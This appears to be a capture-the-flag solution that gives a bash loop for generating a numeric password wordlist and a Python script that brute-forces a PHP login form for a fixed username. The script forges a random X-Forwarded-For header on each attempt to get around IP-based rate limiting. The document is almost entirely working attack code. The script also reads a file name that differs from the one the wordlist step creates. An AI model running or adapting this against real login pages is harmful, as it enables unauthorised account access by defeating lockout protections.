
First create a password list
```bash
for i in {0000..9999};do echo "Tokyo$i";done > password.txt
```

then run this script
```python
import requests
import random
import sys
TARGET_URL="http://<target_ip>/auth.php"
req_base={
    "Host": "<target_ip>",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://<target_ip>/",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://<target_ip>",
    "Connection": "keep-alive",
    "Cookie": "PHPSESSID=5q51ahsf8h81un127a8mu6g3pe",
    "Priority": "u=0"
}

def get_rand_ip():
    return f"10.10.{random.randint(0,255)}.{random.randint(0,254)}"

def main():
    try:
        with open('pass2.txt','r') as f:
            passwords=f.read().splitlines()
    except FileNotFoundError:
        print("file not found")
        sys.exit(1)

    for password in passwords:
        #copy the req_base so the original req_base is not changed
        req=req_base.copy()
        #first change ip
        req["X-Forwarded-For"]=get_rand_ip()
        data={
            "username":"deliver11",
            "password":password
        }
        try:
            resp=requests.post(TARGET_URL,headers=req,data=data)
            if '"error":"auth_failed"' in resp.text:
                continue
            else:
                print(f"found {password}")
                sys.exit(0)


        except Exception as e:
            print(f"Request Error:{e}")
            continue


if __name__ == "__main__":
    main()

```
